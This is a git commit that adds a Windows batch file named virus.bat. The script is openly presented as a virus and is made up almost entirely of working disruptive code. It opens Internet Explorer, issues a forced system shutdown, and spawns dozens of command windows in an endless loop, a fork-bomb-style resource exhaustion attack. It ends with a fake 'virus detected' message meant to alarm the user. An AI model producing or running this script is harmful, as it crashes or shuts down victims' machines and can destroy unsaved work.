744af156e3d3fd647a741ad8b015677a89cf6b5c
TheAdolfo <162178915+TheAdolfo@users.noreply.github.com>
2024-03-04 13:51:18 -0400

    Script hecho en batch

---
+++ virus.bat
@@ -0,0 +1,37 @@
+@echo off 
+CLS
+:A
+start iexplore.exe
+start cmd
+start cmd
+start cmd
+start cmd
+shutdown /s
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+goto A
+echo Fatal Error. Virus detectado!
